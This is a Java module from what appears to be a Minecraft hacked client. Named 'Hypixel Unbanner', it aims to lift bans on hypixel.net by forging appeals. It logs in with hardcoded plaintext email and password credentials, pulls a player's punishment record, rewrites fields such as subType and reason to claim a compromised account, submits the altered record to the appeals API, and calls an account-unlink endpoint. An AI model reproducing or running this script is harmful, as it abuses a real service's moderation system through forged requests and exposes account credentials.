package com.mentalfrostbyte.jello.module.impl.exploit;

import com.mentalfrostbyte.jello.module.util.InDevelopment;
import com.mentalfrostbyte.jello.module.Module;
import com.mentalfrostbyte.jello.module.ModuleCategory;
import org.apache.commons.io.IOUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import totalcross.json.JSONArray;
import totalcross.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@InDevelopment
public class HypixelForceUnbanner extends Module {
   private HttpClient httpClient;
   private final CookieStore cookieStore = new BasicCookieStore();
   private final HttpClientBuilder httpClientBuilder = HttpClientBuilder.create().setDefaultCookieStore(this.cookieStore);
   private String xfToken = "";

   public HypixelForceUnbanner() {
      super(ModuleCategory.EXPLOIT, "Hypixel Unbanner", "Force unbans you from Hypixel xD");
      this.httpClient = this.httpClientBuilder.build();
   }

   @Override
   public void onEnable() {
      try {
         String punishmentId = "D8374378";
         String username = mc.session.getUsername();
         String uuid = mc.session.getPlayerID().replaceAll("-", "");

         if (loginToHypixel("CREEPAKILLER987@S0NY.IGG.BIZ", "3Qs-Cnt-Dec-Tee")) {
            resetPunishment();
            JSONObject punishmentDetails = getPunishmentDetails(punishmentId, uuid);
            System.out.println(punishmentDetails);
            punishmentDetails.put("duration", "Permanent");
            punishmentDetails.put("subType", "COMPROMISED_ACCOUNT");
            punishmentDetails.put("reason", "Account Security Alert");
            punishmentDetails.put("tags", new JSONArray().put("FI"));
            punishmentDetails.put("type", "0");

            if (submitAppeal(punishmentDetails, username.toLowerCase())) {
               resetPunishment();
            }

            resetPunishment();
         }
      } catch (IOException e) {
         e.printStackTrace();
      }
   }

   private boolean loginToHypixel(String email, String password) throws IOException {
      HttpPost loginRequest = new HttpPost("https://hypixel.net/login/login");
      ArrayList<BasicNameValuePair> params = new ArrayList<>();
      params.add(new BasicNameValuePair("login", email));
      params.add(new BasicNameValuePair("register", "0"));
      params.add(new BasicNameValuePair("password", password));
      params.add(new BasicNameValuePair("cookie_check", "1"));
      params.add(new BasicNameValuePair("_xfToken", this.xfToken));
      params.add(new BasicNameValuePair("redirect", "https://hypixel.net/forums/"));
      loginRequest.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

      HttpResponse response = this.httpClient.execute(loginRequest);
      HttpEntity entity = response.getEntity();

      if (entity == null) {
         return false;
      }

      InputStream inputStream = entity.getContent();
      String responseContent = IOUtils.toString(inputStream, "UTF-8");

      Matcher matcher = Pattern.compile("<input type=\"hidden\" name=\"_xfToken\" value=\"([^\"]+)\" />").matcher(responseContent);
      if (matcher.find()) {
         this.xfToken = matcher.group(1);
      }

      inputStream.close();
      return true;
   }

   private boolean submitAppeal(JSONObject appealData, String playerName) throws IOException {
      HttpPost appealRequest = new HttpPost("https://hypixel.net/appeals/api/submit");
      ArrayList<BasicNameValuePair> params = new ArrayList<>();
      appealRequest.setHeader("authority", "hypixel.net");
      appealRequest.setHeader("accept", "application/json, text/plain, */*");
      appealRequest.setHeader("x-requested-with", "XMLHttpRequest");
      appealRequest.setHeader("referer", "https://hypixel.net/appeals/create");

      if (!appealData.has("punishment_type")) {
         return false;
      }

      params.add(new BasicNameValuePair("punishment_type", appealData.getString("punishment_type")));
      params.add(new BasicNameValuePair("attachment_hash", "ecdfa37933135aa9c4cd995b98e25f83"));
      params.add(new BasicNameValuePair("player[name]", playerName));
      params.add(new BasicNameValuePair("player[uuid]", appealData.getString("uuid")));
      params.add(new BasicNameValuePair("punishment_id", appealData.getString("partialId")));

      Iterator<String> keys = appealData.keys();
      while (keys.hasNext()) {
         String key = keys.next();
         if (!key.equals("tags")) {
            params.add(new BasicNameValuePair("punishment[" + key + "]", appealData.getString(key)));
         } else {
            params.add(new BasicNameValuePair("punishment[" + key + "][]", appealData.getJSONArray(key).getString(0)));
         }
      }

      params.add(new BasicNameValuePair("appeal_justification", ""));
      params.add(new BasicNameValuePair("server_rules_acknowledgement", ""));
      params.add(new BasicNameValuePair("_xfToken", this.xfToken));
      params.add(new BasicNameValuePair("ban_category", "account_security_alert"));
      params.add(new BasicNameValuePair("hacks_used", ""));
      params.add(new BasicNameValuePair("hack_removal_acknowledgement", ""));
      params.add(new BasicNameValuePair("comp_account_acknowledgement", ""));
      params.add(new BasicNameValuePair("minecraft_password_change_acknowledgement", "Yes"));
      params.add(new BasicNameValuePair("previous_ban_acknowledgement", "No"));
      params.add(new BasicNameValuePair("account_security_alert_acknowledgement", "Yes"));

      appealRequest.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
      HttpResponse response = this.httpClient.execute(appealRequest);
      HttpEntity entity = response.getEntity();

      if (entity == null) {
         return false;
      }

      InputStream inputStream = entity.getContent();
      System.out.println(IOUtils.toString(inputStream, "UTF-8"));
      inputStream.close();
      return true;
   }

   private JSONObject getPunishmentDetails(String punishmentId, String uuid) throws IOException {
      HttpGet punishmentRequest = new HttpGet("https://hypixel.net/api/account/punishment?type=ban&id=" + punishmentId + "&player_uuid=" + uuid);
      punishmentRequest.setHeader("authority", "hypixel.net");
      punishmentRequest.setHeader("accept", "application/json, text/plain, */*");
      punishmentRequest.setHeader("x-requested-with", "XMLHttpRequest");
      punishmentRequest.setHeader("referer", "https://hypixel.net/appeals/create");

      HttpResponse response = this.httpClient.execute(punishmentRequest);
      HttpEntity entity = response.getEntity();

      if (entity == null) {
         return null;
      }

      InputStream inputStream = entity.getContent();
      String responseContent = IOUtils.toString(inputStream, "UTF-8");
      inputStream.close();

      return new JSONObject(responseContent);
   }

   private void resetPunishment() throws IOException {
      HttpGet unlinkRequest = new HttpGet("https://hypixel.net/account/unlink-minecraft");
      unlinkRequest.setHeader("authority", "hypixel.net");
      unlinkRequest.setHeader("accept", "application/json, text/plain, */*");
      unlinkRequest.setHeader("x-requested-with", "XMLHttpRequest");
      unlinkRequest.setHeader("referer", "https://hypixel.net/account/minecraft");

      HttpResponse response = this.httpClient.execute(unlinkRequest);
      HttpEntity entity = response.getEntity();

      if (entity != null) {
         InputStream inputStream = entity.getContent();
         inputStream.close();
      }
   }
}
